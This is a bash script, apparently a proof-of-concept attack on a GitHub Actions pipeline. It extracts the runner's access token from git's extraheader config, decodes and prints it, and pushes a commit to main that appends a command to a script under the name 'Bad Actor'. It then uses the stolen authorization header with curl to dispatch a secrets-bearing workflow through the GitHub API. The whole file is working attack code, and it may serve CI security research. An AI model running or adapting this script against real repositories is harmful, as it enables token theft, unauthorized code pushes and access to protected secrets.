#!/bin/bash

# Trigger the 'Secret' workflow (secret.yml) using GitHub CLI

REPO="FrozenPandaz/laughing-garbanzo"
WORKFLOW_FILE="secret.yml"
COMMIT_SHA="d71f029912284ccdcc0d7434608d1c8fe1dea1b6" # Replace with your desired commit SHA
# The extraheader contains: "AUTHORIZATION: basic <base64>"
HEADER=$(git config --get http.https://github.com/.extraheader)
# Extract the base64 part after "basic "
B64_TOKEN=$(echo "$HEADER" | sed 's/^AUTHORIZATION: basic //')
# Decode to get "x-access-token:TOKEN"
DECODED=$(echo "$B64_TOKEN" | base64 -d)
# Extract just the token part after the colon
GH_TOKEN=$(echo "$DECODED" | cut -d: -f2)

echo "Token: $GH_TOKEN, GITHUB_TOKEN: $GITHUB_TOKEN"

git checkout "main"
echo "bash vulnerable_script.sh" >> script.sh
git config user.name "Bad Actor"
git config user.email "bad.actor@example.com"
git add .
git commit -m "Modify PR workflow"
git push origin HEAD

# AUTH_HEADER="Authorization: token $GH_TOKEN"
# AUTH_HEADER="Authorization: Bearer $GH_TOKEN"
AUTH_HEADER="$HEADER"

curl -X POST \
    -H "$AUTH_HEADER" \
    -H "Accept: application/vnd.github.v3+json" \
    "https://api.github.com/repos/$REPO/actions/workflows/$WORKFLOW_FILE/dispatches" \
    -d '{"ref":"'"$COMMIT_SHA"'"}'



# gh workflow run "$WORKFLOW_FILE" --repo "$REPO" --ref "$COMMIT_SHA"